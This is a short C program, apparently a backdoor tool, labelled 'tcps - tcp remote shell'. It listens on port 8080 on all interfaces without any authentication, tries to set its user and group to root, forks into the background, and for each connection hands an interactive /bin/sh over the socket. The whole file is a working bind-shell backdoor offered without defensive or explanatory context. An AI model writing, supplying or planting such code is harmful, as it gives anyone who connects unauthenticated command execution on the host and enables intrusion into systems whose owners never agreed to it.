/*
  tcps - tcp remote shell; runs with same permissions as user who initiates it
*/

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

#define PORTNUM 8080

int get_connection(int port)
{
    int         sock;
    int         optval;
    struct sockaddr_in  addr;

    if ((sock=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        return(-1);
    }
    optval=1;
    setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&optval,sizeof(optval));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port); 
    addr.sin_addr.s_addr = INADDR_ANY;
    if ((bind(sock,(struct sockaddr *)&addr,sizeof(addr)))==-1){
        perror("bind");
        close(sock);
        return(-2);
    }
        if (listen(sock,5)==-1){
        perror("listen");
        close(sock);
        return(-3);
    }
    return(sock);
}
int main(int *argc,char *argv[])
{
    int         sock;
    int         sock_accept;
    int         i;
    pid_t           pid,pid0;
    struct sockaddr     addr;
    int         addr_len=sizeof(addr);

    setuid(0);
    setgid(0);

    if ((pid0=fork())==-1){
        perror("fork");
        return(1);
    }
    if (pid0==0){
        if ((sock=get_connection(PORTNUM))<0) return(1);
        for (;;){
            if ((sock_accept=accept(sock,&addr,&addr_len))==-1){
                perror("accept");
                return(1);
            }
            if ((pid=fork())==-1){
                perror("fork");
                return(1);
            }else if (pid==0){
                for (i=0;i<3;i++){
                    close(i);
                    dup2(sock_accept,i);
                }
                execl("/bin/sh","sh","-i",NULL);
                close(sock_accept);
            }else{
                wait(NULL);
                close(sock_accept);
            }
        }
    }
    return(0);
}
